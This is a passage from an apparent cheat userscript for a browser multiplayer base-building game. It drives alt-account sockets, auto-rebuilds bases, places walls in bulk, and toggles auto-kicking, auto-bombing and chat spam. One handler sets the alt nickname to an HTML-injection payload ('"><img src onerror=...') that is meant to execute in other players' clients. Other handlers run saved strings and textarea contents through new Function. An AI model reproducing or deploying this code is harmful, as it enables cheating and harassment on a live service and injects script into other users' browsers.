        };

        if (window.findPlayer) {
            if (myPlayer.position.y - window.playerY > 100 || Math.sqrt(Math.pow((myPlayer.position.y - window.playerY), 2) + Math.pow((myPlayer.position.x - window.playerX), 2)) < 100) {
                game.network.sendPacket(3, { down: 0 });
            } else {
                game.network.sendPacket(3, { down: 1 });
            };
            if (-myPlayer.position.y + window.playerY > 100 || Math.sqrt(Math.pow((myPlayer.position.y - window.playerY), 2) + Math.pow((myPlayer.position.x - window.playerX), 2)) < 100) {
                game.network.sendPacket(3, { up: 0 });
            } else {
                game.network.sendPacket(3, { up: 1 });
            };
            if (-myPlayer.position.x + window.playerX > 100 || Math.sqrt(Math.pow((myPlayer.position.y - window.playerY), 2) + Math.pow((myPlayer.position.x - window.playerX), 2)) < 100) {
                game.network.sendPacket(3, { left: 0 });
            } else {
                game.network.sendPacket(3, { left: 1 });
            };
            if (myPlayer.position.x - window.playerX > 100 || Math.sqrt(Math.pow((myPlayer.position.y - window.playerY), 2) + Math.pow((myPlayer.position.x - window.playerX), 2)) < 100) {
                game.network.sendPacket(3, { right: 0 });
            } else {
                game.network.sendPacket(3, { right: 1 });
            };
        };

        Object.values(window.allSockets).forEach(ws => {
            if (!ws.isclosed) {
                if (mousemove) {
                    let mouseToWorld = game.renderer.screenToWorld(game.ui.mousePosition.x, game.ui.mousePosition.y);
                    ws.network.sendPacket(3, {
                        mouseMoved: game.inputPacketCreator.screenToYaw((-ws.myPlayer.position.x + mouseToWorld.x) * 100, (-ws.myPlayer.position.y + mouseToWorld.y) * 100)
                    });
                    ws.a77 != null && (ws.a77 = null);
                    ws.a77r != null && (ws.a77r = null);
                    let aimingYaw1 = screenToYaw((-ws.myPlayer.position.x + mouseToWorld.x) * 100, (-ws.myPlayer.position.y + mouseToWorld.y) * 100);
                    ws.aimingYaw = aimingYaw1;
                    let yaw = movement_1.aimToYaw(aimingYaw1);
                    if (yaw) {
                        if (!ws.reversedYaw) {
                            ws.a77r != null && (ws.a77r = null);
                            yaw == 90 ? (ws.a77 != 90 ? (ws.a77 = 90, ws.network.sendPacket(3, { right: 1, left: 0, up: 0, down: 0 })) : 0) : 0;
                            yaw == 225 ? (ws.a77 != 225 ? (ws.a77 = 225, ws.network.sendPacket(3, { down: 1, left: 1, up: 0, right: 0 })) : 0) : 0;
                            yaw == 45 ? (ws.a77 != 45 ? (ws.a77 = 45, ws.network.sendPacket(3, { down: 0, left: 0, up: 1, right: 1 })) : 0) : 0;
                            yaw == 315 ? (ws.a77 != 315 ? (ws.a77 = 315, ws.network.sendPacket(3, { down: 0, left: 1, up: 1, right: 0 })) : 0) : 0;
                            yaw == 135 ? (ws.a77 != 135 ? (ws.a77 = 135, ws.network.sendPacket(3, { down: 1, left: 0, up: 0, right: 1 })) : 0) : 0;
                            yaw == 359 ? (ws.a77 != 359 ? (ws.a77 = 359, ws.network.sendPacket(3, { up: 1, down: 0, right: 0, left: 0 })) : 0) : 0;
                            yaw == 180 ? (ws.a77 != 180 ? (ws.a77 = 180, ws.network.sendPacket(3, { down: 1, up: 0, right: 0, left: 0 })) : 0) : 0;
                            yaw == 270 ? (ws.a77 != 270 ? (ws.a77 = 270, ws.network.sendPacket(3, { left: 1, right: 0, up: 0, down: 0 })) : 0) : 0;
                        } else {
                            ws.a77 != null && (ws.a77 = null);
                            yaw == 90 ? (ws.a77r != 90 ? (ws.a77r = 90, ws.network.sendPacket(3, { left: 1, right: 0, up: 0, down: 0 })) : 0) : 0;
                            yaw == 225 ? (ws.a77r != 225 ? (ws.a77r = 225, ws.network.sendPacket(3, { down: 0, left: 0, up: 1, right: 1 })) : 0) : 0;
                            yaw == 45 ? (ws.a77r != 45 ? (ws.a77r = 45, ws.network.sendPacket(3, { down: 1, left: 1, up: 0, right: 0 })) : 0) : 0;
                            yaw == 315 ? (ws.a77r != 315 ? (ws.a77r = 315, ws.network.sendPacket(3, { down: 1, left: 0, up: 0, right: 1 })) : 0) : 0;
                            yaw == 135 ? (ws.a77r != 135 ? (ws.a77r = 135, ws.network.sendPacket(3, { down: 0, left: 1, up: 1, right: 0 })) : 0) : 0;
                            yaw == 359 ? (ws.a77r != 359 ? (ws.a77r = 359, ws.network.sendPacket(3, { up: 0, down: 1, right: 0, left: 0 })) : 0) : 0;
                            yaw == 180 ? (ws.a77r != 180 ? (ws.a77r = 180, ws.network.sendPacket(3, { down: 0, up: 1, right: 0, left: 0 })) : 0) : 0;
                            yaw == 270 ? (ws.a77r != 270 ? (ws.a77r = 270, ws.network.sendPacket(3, { left: 0, right: 1, up: 0, down: 0 })) : 0) : 0;
                        };
                    };
                };
                if (lock) {
                    if (window.mousemove) return;
                    count++;
                    count == 1 && (
                        window.lockPos = {
                            x: game.renderer.screenToWorld(Object.freeze(game.ui.mousePosition).x, 0).x,
                            y: game.renderer.screenToWorld(0, Object.freeze(game.ui.mousePosition).y).y
                        }
                    );
                    let pos = window.lockPos;
                    if (!pos) return;
                    ws.network.sendPacket(3, {
                        mouseMoved: game.inputPacketCreator.screenToYaw((-ws.myPlayer.position.x + window.lockPos.x) * 100, (-ws.myPlayer.position.y + window.lockPos.y) * 100)
                    });
                    ws.a77 != null && (ws.a77 = null);
                    ws.a77r != null && (ws.a77r = null);
                    let aimingYaw1 = screenToYaw((-ws.myPlayer.position.x + window.lockPos.x) * 100, (-ws.myPlayer.position.y + window.lockPos.y) * 100);
                    ws.aimingYaw = aimingYaw1;
                    let yaw = movement_1.aimToYaw(aimingYaw1);
                    if (yaw) {
                        if (!ws.reversedYaw) {
                            ws.a77r != null && (ws.a77r = null);
                            yaw == 90 ? (ws.a77 != 90 ? (ws.a77 = 90, ws.network.sendPacket(3, { right: 1, left: 0, up: 0, down: 0 })) : 0) : 0;
                            yaw == 225 ? (ws.a77 != 225 ? (ws.a77 = 225, ws.network.sendPacket(3, { down: 1, left: 1, up: 0, right: 0 })) : 0) : 0;
                            yaw == 45 ? (ws.a77 != 45 ? (ws.a77 = 45, ws.network.sendPacket(3, { down: 0, left: 0, up: 1, right: 1 })) : 0) : 0;
                            yaw == 315 ? (ws.a77 != 315 ? (ws.a77 = 315, ws.network.sendPacket(3, { down: 0, left: 1, up: 1, right: 0 })) : 0) : 0;
                            yaw == 135 ? (ws.a77 != 135 ? (ws.a77 = 135, ws.network.sendPacket(3, { down: 1, left: 0, up: 0, right: 1 })) : 0) : 0;
                            yaw == 359 ? (ws.a77 != 359 ? (ws.a77 = 359, ws.network.sendPacket(3, { up: 1, down: 0, right: 0, left: 0 })) : 0) : 0;
                            yaw == 180 ? (ws.a77 != 180 ? (ws.a77 = 180, ws.network.sendPacket(3, { down: 1, up: 0, right: 0, left: 0 })) : 0) : 0;
                            yaw == 270 ? (ws.a77 != 270 ? (ws.a77 = 270, ws.network.sendPacket(3, { left: 1, right: 0, up: 0, down: 0 })) : 0) : 0;
                        } else {
                            ws.a77 != null && (ws.a77 = null);
                            yaw == 90 ? (ws.a77r != 90 ? (ws.a77r = 90, ws.network.sendPacket(3, { left: 1, right: 0, up: 0, down: 0 })) : 0) : 0;
                            yaw == 225 ? (ws.a77r != 225 ? (ws.a77r = 225, ws.network.sendPacket(3, { down: 0, left: 0, up: 1, right: 1 })) : 0) : 0;
                            yaw == 45 ? (ws.a77r != 45 ? (ws.a77r = 45, ws.network.sendPacket(3, { down: 1, left: 1, up: 0, right: 0 })) : 0) : 0;
                            yaw == 315 ? (ws.a77r != 315 ? (ws.a77r = 315, ws.network.sendPacket(3, { down: 1, left: 0, up: 0, right: 1 })) : 0) : 0;
                            yaw == 135 ? (ws.a77r != 135 ? (ws.a77r = 135, ws.network.sendPacket(3, { down: 0, left: 1, up: 1, right: 0 })) : 0) : 0;
                            yaw == 359 ? (ws.a77r != 359 ? (ws.a77r = 359, ws.network.sendPacket(3, { up: 0, down: 1, right: 0, left: 0 })) : 0) : 0;
                            yaw == 180 ? (ws.a77r != 180 ? (ws.a77r = 180, ws.network.sendPacket(3, { down: 0, up: 1, right: 0, left: 0 })) : 0) : 0;
                            yaw == 270 ? (ws.a77r != 270 ? (ws.a77r = 270, ws.network.sendPacket(3, { left: 0, right: 1, up: 0, down: 0 })) : 0) : 0;
                        };
                    };

                };
            };
        });
    };
};

if (!window.baseSave) {
    window.baseSave = '[]';
};

let buildingsByPos = new Map();

window.saveBase_ = () => {
    let stash = GetGoldStash();

    if (stash == undefined) return;;

    let stashPosition = {
        x: stash.x,
        y: stash.y
    };

    let parsedSavedStorage = [];

    for (let i in game.ui.buildings) {
        let building = game.ui.buildings[i];

        parsedSavedStorage.push({
            buildingType: building.type,
            stashOffsetX: stash.x - building.x,
            stashOffsetY: stash.y - building.y,
            lastTier: building.tier,
            yaw: building.yaw
        });
    };

    window.baseSave = JSON.stringify(parsedSavedStorage);
};

window.buildBase_ = () => {
    let stash = GetGoldStash();

    if (stash == undefined) return;;

    let stashPosition = {
        x: stash.x,
        y: stash.y
    };

    let parsedSavedStorage = window.baseSave;

    if (parsedSavedStorage) {
        parsedSavedStorage = JSON.parse(window.baseSave);

        for (let i of parsedSavedStorage) {
            game.network.sendRpc2({ name: "MakeBuilding", type: i.buildingType, x: Math.round(parseInt(stash.x) - i.stashOffsetX), y: Math.round(parseInt(stash.y) - i.stashOffsetY), yaw: i.yaw });
        };
    };
};

window.toggleRebuilder = () => {
    let parsedSavedStorage = window.baseSave;

    if (parsedSavedStorage) {
        parsedSavedStorage = JSON.parse(window.baseSave);

        buildingsByPos = new Map();

        for (let i of parsedSavedStorage) {
            buildingsByPos.set(`${i.stashOffsetX}, ${i.stashOffsetY}`, i);
        };

        if (!window.rebuilderInterval) {
            window.saveBase_();

            window.rebuilderInterval = setInterval(() => {
                window.buildBase_();

                let buildingsArr = Object.values(game.ui.buildings);
                let stash = buildingsArr[0];

                stash && buildingsArr.forEach(e => {
                    let building = buildingsByPos.get(`${stash.x - e.x}, ${stash.y - e.y}`);

                    if (building && e.tier < building.lastTier) {
                        game.network.sendRpc2({ name: "UpgradeBuilding", uid: e.uid });
                    };
                });
            }, 200);
        } else {
            window.rebuilderInterval = clearInterval(window.rebuilderInterval);
        };
    } else return;
};

game.network.sendRpc2 = game.network.sendRpc;

const placeWall = (x, y) => {
    game.network.sendRpc2({ name: 'MakeBuilding', x: x, y: y, type: "Wall", yaw: 0 });
};

game.network.sendRpc = (data) => {
    let gridPos = { x: data.x, y: data.y };
    let multiple = 1;
    let block = 48;
    if (data.name === "MakeBuilding" && data.type === "Wall" && x3toggle) {
        placeWall(gridPos.x, gridPos.y);
        placeWall(gridPos.x + 48, gridPos.y);
        placeWall(gridPos.x, gridPos.y + 48);
        placeWall(gridPos.x - 48, gridPos.y);
        placeWall(gridPos.x, gridPos.y - 48);
        placeWall(gridPos.x - 48, gridPos.y + 48);
        placeWall(gridPos.x + 48, gridPos.y - 48);
        placeWall(gridPos.x + 48, gridPos.y + 48);
        placeWall(gridPos.x - 48, gridPos.y - 48);
    };
    if (data.name === "MakeBuilding" && data.type === "Wall" && x5toggle) {
        placeWall(gridPos.x - 48 - 48, gridPos.y + 48 + 48);
        placeWall(gridPos.x - 48, gridPos.y + 48 + 48);
        placeWall(gridPos.x, gridPos.y + 48 + 48);
        placeWall(gridPos.x + 48, gridPos.y + 48 + 48);
        placeWall(gridPos.x + 48 + 48, gridPos.y + 48 + 48);
        placeWall(gridPos.x - 48 - 48, gridPos.y + 48);
        placeWall(gridPos.x - 48, gridPos.y + 48);
        placeWall(gridPos.x, gridPos.y + 48);
        placeWall(gridPos.x + 48, gridPos.y + 48);
        placeWall(gridPos.x + 48 + 48, gridPos.y + 48);
        placeWall(gridPos.x - 48 - 48, gridPos.y);
        placeWall(gridPos.x - 48, gridPos.y);
        placeWall(gridPos.x, gridPos.y);
        placeWall(gridPos.x + 48, gridPos.y);
        placeWall(gridPos.x + 48 + 48, gridPos.y);
        placeWall(gridPos.x - 48 - 48, gridPos.y - 48);
        placeWall(gridPos.x - 48, gridPos.y - 48);
        placeWall(gridPos.x, gridPos.y - 48);
        placeWall(gridPos.x + 48, gridPos.y - 48);
        placeWall(gridPos.x + 48 + 48, gridPos.y - 48);
        placeWall(gridPos.x - 48 - 48, gridPos.y - 48 - 48);
        placeWall(gridPos.x - 48, gridPos.y - 48 - 48);
        placeWall(gridPos.x, gridPos.y - 48 - 48);
        placeWall(gridPos.x + 48, gridPos.y - 48 - 48);
        placeWall(gridPos.x + 48 + 48, gridPos.y - 48 - 48);
    };
    if (data.name === "MakeBuilding" && data.type === "Wall" && x7toggle) {
        placeWall(gridPos.x - 48 - 48 - 48, gridPos.y + 48 + 48 + 48);
        placeWall(gridPos.x - 48 - 48, gridPos.y + 48 + 48 + 48);
        placeWall(gridPos.x - 48, gridPos.y + 48 + 48 + 48);
        placeWall(gridPos.x, gridPos.y + 48 + 48 + 48);
        placeWall(gridPos.x + 48, gridPos.y + 48 + 48 + 48);
        placeWall(gridPos.x + 48 + 48, gridPos.y + 48 + 48 + 48);
        placeWall(gridPos.x + 48 + 48 + 48, gridPos.y + 48 + 48 + 48);
        placeWall(gridPos.x - 48 - 48 - 48, gridPos.y + 48 + 48);
        placeWall(gridPos.x - 48 - 48, gridPos.y + 48 + 48);
        placeWall(gridPos.x - 48, gridPos.y + 48 + 48);
        placeWall(gridPos.x, gridPos.y + 48 + 48);
        placeWall(gridPos.x + 48, gridPos.y + 48 + 48);
        placeWall(gridPos.x + 48 + 48, gridPos.y + 48 + 48);
        placeWall(gridPos.x + 48 + 48 + 48, gridPos.y + 48 + 48);
        placeWall(gridPos.x - 48 - 48 - 48, gridPos.y + 48);
        placeWall(gridPos.x - 48 - 48, gridPos.y + 48);
        placeWall(gridPos.x - 48, gridPos.y + 48);
        placeWall(gridPos.x, gridPos.y);
        placeWall(gridPos.x + 48, gridPos.y + 48);
        placeWall(gridPos.x + 48 + 48, gridPos.y + 48);
        placeWall(gridPos.x + 48 + 48 + 48, gridPos.y + 48);
        placeWall(gridPos.x - 48 - 48 - 48, gridPos.y);
        placeWall(gridPos.x - 48 - 48, gridPos.y);
        placeWall(gridPos.x - 48, gridPos.y);
        placeWall(gridPos.x, gridPos.y);
        placeWall(gridPos.x + 48, gridPos.y);
        placeWall(gridPos.x + 48 + 48, gridPos.y);
        placeWall(gridPos.x + 48 + 48 + 48, gridPos.y);
        placeWall(gridPos.x - 48 - 48 - 48, gridPos.y - 48);
        placeWall(gridPos.x - 48 - 48, gridPos.y - 48);
        placeWall(gridPos.x - 48, gridPos.y - 48);
        placeWall(gridPos.x, gridPos.y - 48);
        placeWall(gridPos.x + 48, gridPos.y - 48);
        placeWall(gridPos.x + 48 + 48, gridPos.y - 48);
        placeWall(gridPos.x + 48 + 48 + 48, gridPos.y - 48);
        placeWall(gridPos.x - 48 - 48 - 48, gridPos.y - 48 - 48);
        placeWall(gridPos.x - 48 - 48, gridPos.y - 48 - 48);
        placeWall(gridPos.x - 48, gridPos.y - 48 - 48);
        placeWall(gridPos.x, gridPos.y - 48 - 48);
        placeWall(gridPos.x + 48, gridPos.y - 48 - 48);
        placeWall(gridPos.x + 48 + 48, gridPos.y - 48 - 48);
        placeWall(gridPos.x + 48 + 48 + 48, gridPos.y - 48 - 48);
        placeWall(gridPos.x - 48 - 48 - 48, gridPos.y - 48 - 48 - 48);
        placeWall(gridPos.x - 48 - 48, gridPos.y - 48 - 48 - 48);
        placeWall(gridPos.x - 48, gridPos.y - 48 - 48 - 48);
        placeWall(gridPos.x, gridPos.y - 48 - 48 - 48);
        placeWall(gridPos.x + 48, gridPos.y - 48 - 48 - 48);
        placeWall(gridPos.x + 48 + 48, gridPos.y - 48 - 48 - 48);
        placeWall(gridPos.x + 48 + 48 + 48, gridPos.y - 48 - 48 - 48);
        placeWall(gridPos.x, gridPos.y);
        placeWall(gridPos.x + 48, gridPos.y);
        placeWall(gridPos.x, gridPos.y + 48);
        placeWall(gridPos.x - 48, gridPos.y);
        placeWall(gridPos.x, gridPos.y - 48);
        placeWall(gridPos.x - 48, gridPos.y + 48);
        placeWall(gridPos.x + 48, gridPos.y - 48);
        placeWall(gridPos.x + 48, gridPos.y + 48);
        placeWall(gridPos.x - 48, gridPos.y - 48);
    };
    game.network.sendRpc2(data);
};

function GetGoldStash() {
    for (let i in game.ui.buildings) {
        if (game.ui.buildings[i].type == "GoldStash") {
            return game.ui.buildings[i];
        }
    }
}

PlaceBuilding = function (x, y, building, yaw) {
    game.network.sendPacket(9, { name: "MakeBuilding", x: x, y: y, type: building, yaw: yaw })
}

window.RecordBase = function (baseName) {
    game.ui.getComponent("PopupOverlay").showConfirmation("Are you sure you want to record base? If you recorded it twice, the first recorded base will be deleted.", 1e4, function () {
        game.ui.components.PopupOverlay.showHint("Successfully recorded!");
        let buildings = game.ui.buildings;
        let base = "";
        let stash = GetGoldStash();
        if (stash == undefined) {
            return
        }
        let stashPosition = {
            x: stash.x,
            y: stash.y
        }
        for (var uid in buildings) {
            if (!buildings.hasOwnProperty(uid)) {
                continue
            }

            let obj = buildings[uid]
            let x = game.ui.buildings[obj.uid].x - stashPosition.x
            let y = game.ui.buildings[obj.uid].y - stashPosition.y
            let building = game.ui.buildings[obj.uid].type
            let yaw = 0;
            base += "PlaceBuilding(stashPosition.x + " + x + ", stashPosition.y + " + y + ", '" + building + "', " + yaw + ");"
        }
        localStorage.RecordedBase1 = base
    })
}
window.buildRecordedBase = function () {
    let waitForGoldStash = setInterval(function () {
        if (document.querySelectorAll("[data-building]")[10].classList[1] == "is-disabled") {
            stash = GetGoldStash();
            if (stash == undefined) return
            stashPosition = {
                x: stash.x,
                y: stash.y
            }
            clearInterval(waitForGoldStash)
            game.ui.components.PopupOverlay.showHint("Successfully recorded base were built!");
            var basecode = localStorage.RecordedBase1
            basecode = new Function(basecode)
            return basecode()
        }
    }, 275)
}
window.DeleteRecordedbase = function () {
    game.ui.getComponent("PopupOverlay").showConfirmation("Are you sure you want to delete recorded base?", 1e4, function () {
        game.ui.components.PopupOverlay.showHint("Successfully recorded base has been deleted!");
        localStorage.RecordedBase1 = null;
    })
}
window.RecordBase2 = function (baseName) {
    game.ui.getComponent("PopupOverlay").showConfirmation("Are you sure you want to record base? If you recorded it twice, the first recorded base will be deleted.", 1e4, function () {
        game.ui.components.PopupOverlay.showHint("Successfully recorded!");
        let buildings = game.ui.buildings;
        let base = "";
        let stash = GetGoldStash();
        if (stash == undefined) {
            return
        }
        let stashPosition = {
            x: stash.x,
            y: stash.y
        }
        for (var uid in buildings) {
            if (!buildings.hasOwnProperty(uid)) {
                continue
            }

            let obj = buildings[uid]
            let x = game.ui.buildings[obj.uid].x - stashPosition.x
            let y = game.ui.buildings[obj.uid].y - stashPosition.y
            let building = game.ui.buildings[obj.uid].type
            let yaw = 0;
            base += "PlaceBuilding(stashPosition.x + " + x + ", stashPosition.y + " + y + ", '" + building + "', " + yaw + ");"
        }
        localStorage.RecordedBase2 = base
    })
}
window.buildRecordedBase2 = function () {
    var waitForGoldStash = setInterval(function () {
        if (document.querySelectorAll("[data-building]")[10].classList[1] == "is-disabled") {
            stash = GetGoldStash();
            if (stash == undefined) return
            stashPosition = {
                x: stash.x,
                y: stash.y
            }
            clearInterval(waitForGoldStash)
            game.ui.components.PopupOverlay.showHint("Successfully recorded base were built!");
            var basecode = localStorage.RecordedBase2
            basecode = new Function(basecode)
            return basecode()
        }
    }, 275)
}
window.DeleteRecordedbase2 = function () {
    game.ui.getComponent("PopupOverlay").showConfirmation("Are you sure you want to delete recorded base?", 1e4, function () {
        game.ui.components.PopupOverlay.showHint("Successfully recorded base has been deleted!");
        localStorage.RecordedBase2 = null;
    })
}
window.RecordBase3 = function (baseName) {
    game.ui.getComponent("PopupOverlay").showConfirmation("Are you sure you want to record base? If you recorded it twice, the first recorded base will be deleted.", 1e4, function () {
        game.ui.components.PopupOverlay.showHint("Successfully recorded!");
        let buildings = game.ui.buildings;
        let base = "";
        let stash = GetGoldStash();
        if (stash == undefined) {
            return
        }
        let stashPosition = {
            x: stash.x,
            y: stash.y
        }
        for (var uid in buildings) {
            if (!buildings.hasOwnProperty(uid)) {
                continue
            }

            let obj = buildings[uid]
            let x = game.ui.buildings[obj.uid].x - stashPosition.x
            let y = game.ui.buildings[obj.uid].y - stashPosition.y
            let building = game.ui.buildings[obj.uid].type
            let yaw = 0;
            base += "PlaceBuilding(stashPosition.x + " + x + ", stashPosition.y + " + y + ", '" + building + "', " + yaw + ");"
        }
        localStorage.RecordedBase3 = base
    })
}
window.buildRecordedBase3 = function () {
    var waitForGoldStash = setInterval(function () {
        if (document.querySelectorAll("[data-building]")[10].classList[1] == "is-disabled") {
            stash = GetGoldStash();
            if (stash == undefined) return
            stashPosition = {
                x: stash.x,
                y: stash.y
            }
            clearInterval(waitForGoldStash)
            game.ui.components.PopupOverlay.showHint("Successfully recorded base were built!");
            var basecode = localStorage.RecordedBase3
            basecode = new Function(basecode)
            return basecode()
        }
    }, 275)
}
window.DeleteRecordedbase3 = function () {
    game.ui.getComponent("PopupOverlay").showConfirmation("Are you sure you want to delete recorded base?", 1e4, function () {
        game.ui.components.PopupOverlay.showHint("Successfully recorded base has been deleted!");
        localStorage.RecordedBase3 = null;
    })
}
window.RecordBase4 = function (baseName) {
    game.ui.getComponent("PopupOverlay").showConfirmation("Are you sure you want to record base? If you recorded it twice, the first recorded base will be deleted.", 1e4, function () {
        game.ui.components.PopupOverlay.showHint("Successfully recorded!");
        let buildings = game.ui.buildings;
        let base = "";
        let stash = GetGoldStash();
        if (stash == undefined) {
            return
        }
        let stashPosition = {
            x: stash.x,
            y: stash.y
        }
        for (var uid in buildings) {
            if (!buildings.hasOwnProperty(uid)) {
                continue
            }

            let obj = buildings[uid]
            let x = game.ui.buildings[obj.uid].x - stashPosition.x
            let y = game.ui.buildings[obj.uid].y - stashPosition.y
            let building = game.ui.buildings[obj.uid].type
            let yaw = 0;
            base += "PlaceBuilding(stashPosition.x + " + x + ", stashPosition.y + " + y + ", '" + building + "', " + yaw + ");"
        }
        localStorage.RecordedBase4 = base
    })
}
window.buildRecordedBase4 = function () {
    let waitForGoldStash = setInterval(function () {
        if (document.querySelectorAll("[data-building]")[10].classList[1] == "is-disabled") {
            stash = GetGoldStash();
            if (stash == undefined) return
            stashPosition = {
                x: stash.x,
                y: stash.y
            }
            clearInterval(waitForGoldStash)
            game.ui.components.PopupOverlay.showHint("Successfully recorded base were built!");
            var basecode = localStorage.RecordedBase4
            basecode = new Function(basecode)
            return basecode()
        }
    }, 275)
}
window.DeleteRecordedbase4 = function () {
    game.ui.getComponent("PopupOverlay").showConfirmation("Are you sure you want to delete recorded base?", 1e4, function () {
        game.ui.components.PopupOverlay.showHint("Successfully recorded base has been deleted!");
        localStorage.RecordedBase4 = null;
    })
}
window.buildSavedBase = function () {
    var waitForGoldStash = setInterval(function () {
        if (document.querySelectorAll("[data-building]")[10].classList[1] == "is-disabled") {
            stash = GetGoldStash();
            if (stash == undefined) return
            stashPosition = {
                x: stash.x,
                y: stash.y
            }
            clearInterval(waitForGoldStash)
            var basecode = document.getElementsByClassName("30i3")[0].value;
            basecode = new Function(basecode)
            return basecode()
        }
    }, 275)
}
window.saveBase = () => {
    game.ui.components.PopupOverlay.showHint("Successfully saved!");
    let buildings = game.ui.buildings;
    let base = "";
    let stash = GetGoldStash();
    if (stash == undefined) {
        return
    }
    let stashPosition = {
        x: stash.x,
        y: stash.y
    }
    for (var uid in buildings) {
        if (!buildings.hasOwnProperty(uid)) {
            continue
        }
        let obj = buildings[uid]
        let x = game.ui.buildings[obj.uid].x - stashPosition.x
        let y = game.ui.buildings[obj.uid].y - stashPosition.y
        let building = game.ui.buildings[obj.uid].type
        let yaw = 0;
        base += "PlaceBuilding(stashPosition.x + " + x + ", stashPosition.y + " + y + ", '" + building + "', " + yaw + ");";
    }
    document.getElementsByClassName("30i3")[0].value = base;
}

function sellAllByType(type) {
    if (!game.ui.playerPartyCanSell) return;

    let sellInterval = () => {
        let target = Object.values(game.ui.buildings).find(e => e.type == type);
        if (target !== undefined) {
            game.network.sendPacket(9, { name: "DeleteBuilding", uid: target.uid });

            setTimeout(() => {
                sellInterval();
            }, 100);
        };
    };
    sellInterval();
};

document.getElementsByClassName("1i")[0].addEventListener('click', function () {
    let sellInterval = () => {
        if (Object.keys(game.ui.buildings).length > 1 && game.ui.playerPartyCanSell) {
            game.network.sendPacket(9, { name: "DeleteBuilding", uid: parseInt(Object.keys(game.ui.buildings)[1]) });
            setTimeout(() => { sellInterval(); }, 100);
        };
    };
    sellInterval();
});

document.getElementsByClassName("2i")[0].addEventListener('click', function () {
    sellAllByType("Wall");
});

document.getElementsByClassName("3i")[0].addEventListener('click', function () {
    sellAllByType("Door");
});

document.getElementsByClassName("4i")[0].addEventListener('click', function () {
    sellAllByType("SlowTrap");
});

document.getElementsByClassName("5i")[0].addEventListener('click', function () {
    sellAllByType("ArrowTower");
});

document.getElementsByClassName("6i")[0].addEventListener('click', function () {
    sellAllByType("BombTower");
});

document.getElementsByClassName("7i")[0].addEventListener('click', function () {
    sellAllByType("MagicTower");
});

document.getElementsByClassName("7i")[0].addEventListener('click', function () {
    game.network.sendPacket(9, { name: "DeleteBuilding", uid: petUidToSell });
});
document.getElementsByClassName("8i")[0].addEventListener('click', function () {
    upgradeAll = !upgradeAll;
    document.getElementsByClassName("8i")[0].innerText = "Actitivate Upgrade All!";
    if (upgradeAll) {
        document.getElementsByClassName("8i")[0].innerText = "Deactivate Upgrade All!";
    };
});

document.getElementsByClassName("9i")[0].addEventListener('click', function () {
    AHRC = !AHRC;
    document.getElementsByClassName("9i")[0].innerText = "Activate AHRC!";
    if (AHRC) {
        document.getElementsByClassName("9i")[0].innerText = "Deactivate AHRC!";
    };
});

document.getElementsByClassName("10i")[0].addEventListener('click', function () {
    autohi = !autohi;
    document.getElementsByClassName("10i")[0].innerText = "Enable Auto hi!";
    if (autohi) {
        document.getElementsByClassName("10i")[0].innerText = "Disable Auto hi!";
    };
});

document.getElementsByClassName("11i")[0].addEventListener('click', function () {
    heal = !heal;
    document.getElementsByClassName("11i")[0].innerText = "Auto heal and Pet Heal";

    if (heal) {
        document.getElementsByClassName("11i")[0].innerText = "!Auto heal and Pet Heal";
    };
});

document.getElementsByClassName("12i")[0].addEventListener('click', function () {
    revive = !revive;
    document.getElementsByClassName("12i")[0].innerText = "Revive and Evolve Pets";

    if (revive) {
        document.getElementsByClassName("12i")[0].innerText = "!Revive and Evolve Pets";
    };
});

document.getElementsByClassName("13i")[0].addEventListener('click', function () {
    kick = !kick;
    document.getElementsByClassName("13i")[0].innerText = "Enable Auto Kicker";
    if (kick) {
        document.getElementsByClassName("13i")[0].innerText = "Disable Auto Kicker";
    }
});

document.getElementsByClassName("14i")[0].addEventListener('click', function () {
    clearMsgs = !clearMsgs;
    document.getElementsByClassName("14i")[0].innerText = "Clear Messages";

    if (clearMsgs) {
        document.getElementsByClassName("14i")[0].innerText = "!Clear Messages";
    };
});

document.getElementsByClassName("15i")[0].addEventListener('click', function () {
    x3toggle = !x3toggle;
    document.getElementsByClassName("15i")[0].innerText = "Enable 3x3!";

    if (x3toggle) {
        document.getElementsByClassName("15i")[0].innerText = "Disable 3x3!";
    };
});

document.getElementsByClassName("16i")[0].addEventListener('click', function () {
    x5toggle = !x5toggle;
    document.getElementsByClassName("16i")[0].innerText = "Enable 5x5!";

    if (x5toggle) {
        document.getElementsByClassName("16i")[0].innerText = "Disable 5x5!";
    };
});

document.getElementsByClassName("17i")[0].addEventListener('click', function () {
    x7toggle = !x7toggle;
    document.getElementsByClassName("17i")[0].innerText = "Enable 7x7!";

    if (x7toggle) {
        document.getElementsByClassName("17i")[0].innerText = "Disable 7x7!";
    };
});

document.getElementsByClassName("18i")[0].addEventListener('click', function () {
    respawnToggle = !respawnToggle;
    document.getElementsByClassName("18i")[0].innerText = "Enable Auto Respawn!";

    if (respawnToggle) {
        document.getElementsByClassName("18i")[0].innerText = "Disable Auto Respawn!";
    };
});

document.getElementsByClassName("19i")[0].addEventListener('click', function () {
    kick = !kick

    document.getElementsByClassName("19i")[0].innerText = "Enable Auto Kicker!";
    if (kick) {
        document.getElementsByClassName("19i")[0].innerText = "Disable Auto Kicker!";
    };
})

document.getElementsByClassName("0i2")[0].addEventListener('click', function () {
    altName = game.options.nickname;
    window.sendws();
});

document.getElementsByClassName("28i2")[0].addEventListener('click', function () {
    altName = '"><img src onerror="open(`';
    window.sendws();
});

document.getElementsByClassName("emm")[0].addEventListener('click', function () {
    window.mousemove = !window.mousemove;
    this.innerText = window.mousemove ? "Disable Mousemove!" : "Enable Mousemove!"
});

document.getElementsByClassName("30i2")[0].addEventListener('click', () => {
    window.lock = !window.lock;
    if (window.lock) {
        count = 0;
        delete window.lockPos;
        document.getElementsByClassName("30i2")[0].innerText = 'Unlock Pos!';
    } else if (!window.lock) {
        document.getElementsByClassName("30i2")[0].innerText = 'Lock Pos!';
    };
});

document.getElementsByClassName("19i2")[0].addEventListener('click', () => {
    window.autorefiller = !window.autorefiller
    if (window.autorefiller) {
        document.getElementsByClassName("19i2")[0].innerText = "Disable Auto Refiller"
    } else if (!window.autorefiller) {
        document.getElementsByClassName("19i2")[0].innerText = "Enable Auto Refiller"
    };
});

document.getElementsByClassName('13i2')[0].addEventListener('click', () => {
    window.autoraid = !window.autoraid;
    if (window.autoraid) {
        document.getElementsByClassName('13i2')[0].innerText = 'Disable Autobomb!';
    } else if (!window.autoraid) {
        document.getElementsByClassName('13i2')[0].innerText = 'Enable Autobomb!';
    };
});

document.getElementsByClassName("29i2")[0].addEventListener('click', function () {
    window.spam = !window.spam;

    document.getElementsByClassName("29i2")[0].innerText = "Enable Chat Spam";
    if (window.spam) {
        document.getElementsByClassName("29i2")[0].innerText = "Disable Chat Spam";
    };
});

